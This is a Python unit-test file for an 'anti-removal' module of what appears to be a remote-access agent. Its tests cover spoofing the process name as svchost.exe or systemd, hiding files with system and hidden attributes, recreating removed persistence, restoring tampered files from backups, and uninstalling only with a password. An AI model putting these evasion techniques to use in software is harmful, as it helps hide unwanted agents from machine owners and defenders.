"""
Unit Tests for Anti-Removal Protection Module

Tests process name spoofing, file attribute protection, persistence recreation,
tampering detection, and remote uninstall with password validation.

Requirements: 8.1, 8.2, 8.4, 8.5, 8.6, 8.7
"""

import os
import sys
import pytest
import tempfile
import shutil
import platform
import time
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock, call

# Add parent directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from remote_system.enhanced_agent.anti_removal import (
    AntiRemoval,
    TamperingDetectionResult,
    UninstallResult,
    create_anti_removal
)


class TestAntiRemovalInit:
    """Test AntiRemoval initialization"""
    
    def test_init_basic(self):
        """Test basic initialization"""
        agent_path = "/path/to/agent.exe"
        anti_removal = AntiRemoval(agent_path)
        
        assert anti_removal.agent_path == agent_path
        assert anti_removal.agent_name == "agent.exe"
        assert anti_removal.platform == platform.system()
        assert anti_removal.persistence_plugin is None
        assert anti_removal.uninstall_password is None
        assert anti_removal.monitoring_active is False
    
    def test_init_with_persistence_plugin(self):
        """Test initialization with persistence plugin"""
        agent_path = "/path/to/agent.exe"
        mock_plugin = Mock()
        
        anti_removal = AntiRemoval(agent_path, persistence_plugin=mock_plugin)
        
        assert anti_removal.persistence_plugin is mock_plugin
    
    def test_init_with_password(self):
        """Test initialization with uninstall password"""
        agent_path = "/path/to/agent.exe"
        password = "secret123"
        
        anti_removal = AntiRemoval(agent_path, uninstall_password=password)
        
        assert anti_removal.uninstall_password == password


class TestProcessNameSpoofing:
    """Test process name spoofing - Requirement 8.1"""
    
    @pytest.mark.skipif(platform.system() != 'Windows', reason="Windows-specific test")
    @patch('ctypes.windll.kernel32.SetConsoleTitleW')
    def test_spoof_process_name_windows_default(self, mock_set_title):
        """Test process name spoofing on Windows with default name"""
        agent_path = "C:\\agent.exe"
        anti_removal = AntiRemoval(agent_path)
        
        result = anti_removal.spoof_process_name()
        
        assert result is True
        mock_set_title.assert_called_once_with('svchost.exe')
    
    @pytest.mark.skipif(platform.system() != 'Windows', reason="Windows-specific test")
    @patch('ctypes.windll.kernel32.SetConsoleTitleW')
    def test_spoof_process_name_windows_custom(self, mock_set_title):
        """Test process name spoofing on Windows with custom name"""
        agent_path = "C:\\agent.exe"
        anti_removal = AntiRemoval(agent_path)
        
        result = anti_removal.spoof_process_name('explorer.exe')
        
        assert result is True
        mock_set_title.assert_called_once_with('explorer.exe')
    
    @pytest.mark.skipif(platform.system() != 'Linux', reason="Linux-specific test")
    def test_spoof_process_name_linux_default(self):
        """Test process name spoofing on Linux with default name"""
        agent_path = "/usr/bin/agent"
        anti_removal = AntiRemoval(agent_path)
        
        # Mock prctl module
        with patch.dict('sys.modules', {'prctl': Mock()}):
            import prctl
            prctl.set_name = Mock()
            
            result = anti_removal.spoof_process_name()
            
            assert result is True
            prctl.set_name.assert_called_once_with('systemd')
    
    @pytest.mark.skipif(platform.system() != 'Linux', reason="Linux-specific test")
    def test_spoof_process_name_linux_fallback(self):
        """Test process name spoofing on Linux with fallback method"""
        agent_path = "/usr/bin/agent"
        anti_removal = AntiRemoval(agent_path)
        
        # Mock prctl import failure
        with patch.dict('sys.modules', {'prctl': None}):
            with patch('builtins.open', create=True) as mock_open:
                mock_file = MagicMock()
                mock_open.return_value.__enter__.return_value = mock_file
                
                result = anti_removal.spoof_process_name('systemd')
                
                assert result is True
                mock_open.assert_called_once_with('/proc/self/comm', 'w')
                mock_file.write.assert_called_once_with('systemd')
    
    def test_spoof_process_name_error_handling(self):
        """Test error handling in process name spoofing"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        # Mock platform to cause error
        with patch.object(anti_removal, 'platform', 'UnknownOS'):
            result = anti_removal.spoof_process_name()
            
            assert result is False


class TestFileAttributeProtection:
    """Test file attribute protection - Requirement 8.2"""
    
    def test_protect_file_attributes_nonexistent_file(self):
        """Test protection of nonexistent file"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        result = anti_removal.protect_file_attributes("/nonexistent/file.txt")
        
        assert result is False
    
    @pytest.mark.skipif(platform.system() != 'Windows', reason="Windows-specific test")
    @patch('subprocess.run')
    def test_protect_file_attributes_windows(self, mock_run):
        """Test file attribute protection on Windows"""
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp_path = tmp.name
        
        try:
            agent_path = "C:\\agent.exe"
            anti_removal = AntiRemoval(agent_path)
            
            mock_run.return_value = Mock(returncode=0)
            
            result = anti_removal.protect_file_attributes(tmp_path)
            
            assert result is True
            mock_run.assert_called_once()
            args = mock_run.call_args[0][0]
            assert args[0] == 'attrib'
            assert '+h' in args
            assert '+s' in args
            assert '+r' in args
            assert tmp_path in args
        finally:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
    
    @pytest.mark.skipif(platform.system() == 'Windows', reason="Unix-specific test")
    def test_protect_file_attributes_unix(self):
        """Test file attribute protection on Unix systems"""
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp_path = tmp.name
        
        try:
            agent_path = "/usr/bin/agent"
            anti_removal = AntiRemoval(agent_path)
            
            result = anti_removal.protect_file_attributes(tmp_path)
            
            # Should make file read-only
            assert result is True
            file_mode = os.stat(tmp_path).st_mode
            # Check if file is read-only (no write permissions)
            assert not (file_mode & 0o200)  # Owner write bit should be off
        finally:
            # Restore write permission before deleting
            os.chmod(tmp_path, 0o644)
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)


class TestPersistenceRecreation:
    """Test persistence recreation - Requirement 8.4"""
    
    def test_recreate_persistence_no_plugin(self):
        """Test persistence recreation without plugin"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        result = anti_removal.recreate_persistence()
        
        assert result is False
    
    def test_recreate_persistence_already_installed(self):
        """Test persistence recreation when already installed"""
        agent_path = "/path/to/agent"
        mock_plugin = Mock()
        
        # Mock persistence status - already installed
        mock_status = Mock()
        mock_status.installed = True
        mock_status.active_methods = ['registry', 'startup']
        mock_plugin.check_persistence.return_value = mock_status
        
        anti_removal = AntiRemoval(agent_path, persistence_plugin=mock_plugin)
        
        result = anti_removal.recreate_persistence()
        
        assert result is True
        mock_plugin.check_persistence.assert_called_once()
        mock_plugin.install_persistence.assert_not_called()
    
    def test_recreate_persistence_not_installed(self):
        """Test persistence recreation when not installed"""
        agent_path = "/path/to/agent"
        mock_plugin = Mock()
        
        # Mock persistence status - not installed
        mock_status = Mock()
        mock_status.installed = False
        mock_status.active_methods = []
        mock_plugin.check_persistence.return_value = mock_status
        
        # Mock install result
        mock_result = Mock()
        mock_result.success = True
        mock_plugin.install_persistence.return_value = mock_result
        
        anti_removal = AntiRemoval(agent_path, persistence_plugin=mock_plugin)
        
        result = anti_removal.recreate_persistence()
        
        assert result is True
        mock_plugin.check_persistence.assert_called_once()
        mock_plugin.install_persistence.assert_called_once_with(method='auto')
    
    def test_recreate_persistence_install_failed(self):
        """Test persistence recreation when install fails"""
        agent_path = "/path/to/agent"
        mock_plugin = Mock()
        
        # Mock persistence status - not installed
        mock_status = Mock()
        mock_status.installed = False
        mock_status.active_methods = []
        mock_plugin.check_persistence.return_value = mock_status
        
        # Mock install result - failed
        mock_result = Mock()
        mock_result.success = False
        mock_plugin.install_persistence.return_value = mock_result
        
        anti_removal = AntiRemoval(agent_path, persistence_plugin=mock_plugin)
        
        result = anti_removal.recreate_persistence()
        
        assert result is False


class TestFileRestoration:
    """Test file restoration from backup - Requirement 8.7"""
    
    def test_restore_from_backup_success(self):
        """Test successful file restoration from backup"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create backup file
            backup_dir = os.path.join(tmpdir, 'backup')
            os.makedirs(backup_dir, exist_ok=True)
            backup_file = os.path.join(backup_dir, 'agent.exe')
            
            with open(backup_file, 'w') as f:
                f.write('backup content')
            
            # Target path (doesn't exist yet)
            target_path = os.path.join(tmpdir, 'agent.exe')
            
            agent_path = target_path
            anti_removal = AntiRemoval(agent_path)
            
            # Mock backup locations
            anti_removal.backup_locations = [backup_dir]
            
            # Mock protect_file_attributes to avoid platform-specific issues
            with patch.object(anti_removal, 'protect_file_attributes', return_value=True):
                result = anti_removal.restore_from_backup(target_path)
            
            assert result is True
            assert os.path.exists(target_path)
            
            with open(target_path, 'r') as f:
                content = f.read()
            assert content == 'backup content'
    
    def test_restore_from_backup_no_backup_found(self):
        """Test file restoration when no backup exists"""
        with tempfile.TemporaryDirectory() as tmpdir:
            target_path = os.path.join(tmpdir, 'agent.exe')
            
            agent_path = target_path
            anti_removal = AntiRemoval(agent_path)
            
            # Mock backup locations (empty)
            anti_removal.backup_locations = [os.path.join(tmpdir, 'backup')]
            
            result = anti_removal.restore_from_backup(target_path)
            
            assert result is False


class TestTamperingDetection:
    """Test tampering detection - Requirement 8.7"""
    
    def test_calculate_file_checksum(self):
        """Test file checksum calculation"""
        with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
            tmp.write('test content')
            tmp_path = tmp.name
        
        try:
            agent_path = "/path/to/agent"
            anti_removal = AntiRemoval(agent_path)
            
            checksum = anti_removal.calculate_file_checksum(tmp_path)
            
            assert checksum is not None
            assert len(checksum) == 64  # SHA256 hex digest length
        finally:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
    
    def test_calculate_file_checksum_nonexistent(self):
        """Test checksum calculation for nonexistent file"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        checksum = anti_removal.calculate_file_checksum("/nonexistent/file.txt")
        
        assert checksum is None
    
    def test_add_monitored_file(self):
        """Test adding file to monitoring"""
        with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
            tmp.write('test content')
            tmp_path = tmp.name
        
        try:
            agent_path = "/path/to/agent"
            anti_removal = AntiRemoval(agent_path)
            
            result = anti_removal.add_monitored_file(tmp_path)
            
            assert result is True
            assert tmp_path in anti_removal.monitored_files
            assert tmp_path in anti_removal.file_checksums
        finally:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
    
    def test_add_monitored_file_nonexistent(self):
        """Test adding nonexistent file to monitoring"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        result = anti_removal.add_monitored_file("/nonexistent/file.txt")
        
        assert result is False
    
    def test_detect_tampering_no_tampering(self):
        """Test tampering detection with no tampering"""
        with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
            tmp.write('test content')
            tmp_path = tmp.name
        
        try:
            agent_path = "/path/to/agent"
            anti_removal = AntiRemoval(agent_path)
            
            # Add file to monitoring
            anti_removal.add_monitored_file(tmp_path)
            
            # Detect tampering (should be none)
            result = anti_removal.detect_tampering()
            
            assert result.tampering_detected is False
            assert len(result.affected_files) == 0
            assert len(result.restored_files) == 0
            assert result.error is None
        finally:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
    
    def test_detect_tampering_file_modified(self):
        """Test tampering detection with modified file"""
        with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
            tmp.write('original content')
            tmp_path = tmp.name
        
        try:
            agent_path = "/path/to/agent"
            anti_removal = AntiRemoval(agent_path)
            
            # Add file to monitoring
            anti_removal.add_monitored_file(tmp_path)
            
            # Modify the file
            with open(tmp_path, 'w') as f:
                f.write('modified content')
            
            # Mock restore_from_backup to avoid actual restoration
            with patch.object(anti_removal, 'restore_from_backup', return_value=False):
                result = anti_removal.detect_tampering()
            
            assert result.tampering_detected is True
            assert tmp_path in result.affected_files
        finally:
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
    
    def test_detect_tampering_file_deleted(self):
        """Test tampering detection with deleted file"""
        with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
            tmp.write('test content')
            tmp_path = tmp.name
        
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        # Add file to monitoring
        anti_removal.add_monitored_file(tmp_path)
        
        # Delete the file
        os.unlink(tmp_path)
        
        # Mock restore_from_backup
        with patch.object(anti_removal, 'restore_from_backup', return_value=False):
            result = anti_removal.detect_tampering()
        
        assert result.tampering_detected is True
        assert tmp_path in result.affected_files
    
    def test_detect_tampering_with_restoration(self):
        """Test tampering detection with successful restoration"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create original file
            file_path = os.path.join(tmpdir, 'agent.exe')
            with open(file_path, 'w') as f:
                f.write('original content')
            
            # Create backup
            backup_dir = os.path.join(tmpdir, 'backup')
            os.makedirs(backup_dir, exist_ok=True)
            backup_path = os.path.join(backup_dir, 'agent.exe')
            with open(backup_path, 'w') as f:
                f.write('original content')
            
            agent_path = file_path
            anti_removal = AntiRemoval(agent_path)
            anti_removal.backup_locations = [backup_dir]
            
            # Add file to monitoring
            anti_removal.add_monitored_file(file_path)
            
            # Modify the file
            with open(file_path, 'w') as f:
                f.write('tampered content')
            
            # Mock protect_file_attributes
            with patch.object(anti_removal, 'protect_file_attributes', return_value=True):
                result = anti_removal.detect_tampering()
            
            assert result.tampering_detected is True
            assert file_path in result.affected_files
            assert file_path in result.restored_files


class TestMonitoring:
    """Test continuous monitoring"""
    
    def test_start_monitoring(self):
        """Test starting monitoring"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        result = anti_removal.start_monitoring(check_interval=1)
        
        assert result is True
        assert anti_removal.monitoring_active is True
        assert anti_removal.monitoring_thread is not None
        
        # Stop monitoring
        anti_removal.stop_monitoring()
    
    def test_start_monitoring_already_running(self):
        """Test starting monitoring when already running"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        # Start monitoring
        anti_removal.start_monitoring(check_interval=1)
        
        # Try to start again
        result = anti_removal.start_monitoring(check_interval=1)
        
        assert result is False
        
        # Stop monitoring
        anti_removal.stop_monitoring()
    
    def test_stop_monitoring(self):
        """Test stopping monitoring"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        # Start monitoring
        anti_removal.start_monitoring(check_interval=1)
        
        # Stop monitoring
        anti_removal.stop_monitoring()
        
        assert anti_removal.monitoring_active is False


class TestRemoteUninstall:
    """Test remote uninstall with password - Requirements 8.5, 8.6"""
    
    def test_remote_uninstall_no_password_configured(self):
        """Test uninstall when no password is configured"""
        agent_path = "/path/to/agent"
        anti_removal = AntiRemoval(agent_path)
        
        result = anti_removal.remote_uninstall("anypassword")
        
        assert result.success is False
        assert "No uninstall password configured" in result.error
    
    def test_remote_uninstall_invalid_password(self):
        """Test uninstall with invalid password - Requirement 8.6"""
        agent_path = "/path/to/agent"
        password = "correct_password"
        anti_removal = AntiRemoval(agent_path, uninstall_password=password)
        
        result = anti_removal.remote_uninstall("wrong_password")
        
        assert result.success is False
        assert "Invalid password" in result.error
        assert len(result.removed_items) == 0
    
    def test_remote_uninstall_valid_password(self):
        """Test uninstall with valid password - Requirement 8.5"""
        with tempfile.TemporaryDirectory() as tmpdir:
            agent_path = os.path.join(tmpdir, 'agent.exe')
            
            # Create agent file
            with open(agent_path, 'w') as f:
                f.write('agent')
            
            password = "correct_password"
            mock_plugin = Mock()
            mock_plugin.remove_persistence.return_value = True
            
            anti_removal = AntiRemoval(
                agent_path,
                persistence_plugin=mock_plugin,
                uninstall_password=password
            )
            
            # Mock subprocess.Popen to avoid actual script execution
            with patch('subprocess.Popen'):
                result = anti_removal.remote_uninstall(password)
            
            assert result.success is True
            assert "persistence_mechanisms" in result.removed_items
            assert "agent_executable" in result.removed_items
            assert result.error is None
            
            # Verify persistence removal was called
            mock_plugin.remove_persistence.assert_called_once()
    
    def test_remote_uninstall_removes_backups(self):
        """Test that uninstall removes backup copies"""
        with tempfile.TemporaryDirectory() as tmpdir:
            agent_path = os.path.join(tmpdir, 'agent.exe')
            
            # Create agent file
            with open(agent_path, 'w') as f:
                f.write('agent')
            
            # Create backup
            backup_dir = os.path.join(tmpdir, 'backup')
            os.makedirs(backup_dir, exist_ok=True)
            backup_path = os.path.join(backup_dir, 'agent.exe')
            with open(backup_path, 'w') as f:
                f.write('backup')
            
            password = "correct_password"
            anti_removal = AntiRemoval(agent_path, uninstall_password=password)
            anti_removal.backup_locations = [backup_dir]
            
            # Mock subprocess.Popen and subprocess.run
            with patch('subprocess.Popen'), patch('subprocess.run'):
                result = anti_removal.remote_uninstall(password)
            
            assert result.success is True
            assert not os.path.exists(backup_path)
            assert any('backup:' in item for item in result.removed_items)


class TestFactoryFunction:
    """Test factory function"""
    
    def test_create_anti_removal(self):
        """Test factory function"""
        agent_path = "/path/to/agent"
        mock_plugin = Mock()
        password = "secret"
        
        anti_removal = create_anti_removal(
            agent_path,
            persistence_plugin=mock_plugin,
            uninstall_password=password
        )
        
        assert isinstance(anti_removal, AntiRemoval)
        assert anti_removal.agent_path == agent_path
        assert anti_removal.persistence_plugin is mock_plugin
        assert anti_removal.uninstall_password == password


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
